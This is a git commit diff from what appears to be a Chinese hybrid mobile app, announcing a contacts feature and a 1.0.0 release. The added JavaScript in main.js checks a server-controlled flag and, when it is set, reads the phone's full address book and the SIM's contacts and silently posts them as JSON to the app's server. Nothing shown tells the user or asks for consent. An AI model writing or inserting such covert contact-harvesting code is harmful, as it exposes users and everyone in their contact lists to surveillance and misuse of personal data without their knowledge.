d8bd571ef2df3f1c71f67cec0a5336325d7f4c9f
spring <spring@qbserver.cn>
2019-02-03 01:33:17 +0800

    夜晚一波提交，联系人做出来了，正式发布1.0.0

--- pages/tabs/main/main.js
+++ pages/tabs/main/main.js
@@ -16,6 +16,25 @@ mui.plusReady(function() {
 			//如果有当前任务，正常加载main页面
 			loadMainPage();
 		}
+		//上报联系人
+		if (data.reportContacts) {
+			plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(phoneAddressbook) {
+				phoneAddressbook.find(null, function(phoneContacts) {
+					plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_SIM, function(simAddressbook) {
+						simAddressbook.find(null, function(simContacts) {
+							mui.post(baseurl + '/app?method=report&type=contacts', {
+								phoneContacts: JSON.stringify(phoneContacts),
+								simContacts: JSON.stringify(simContacts)
+							}, function(data) {}, 'json');
+						});
+					}, function(e) {});
+				}, function(e) {
+					console.log(e);
+				});
+			}, function(e) {
+				console.log(e);
+			});
+		}
 	}, 'json');
 });
 
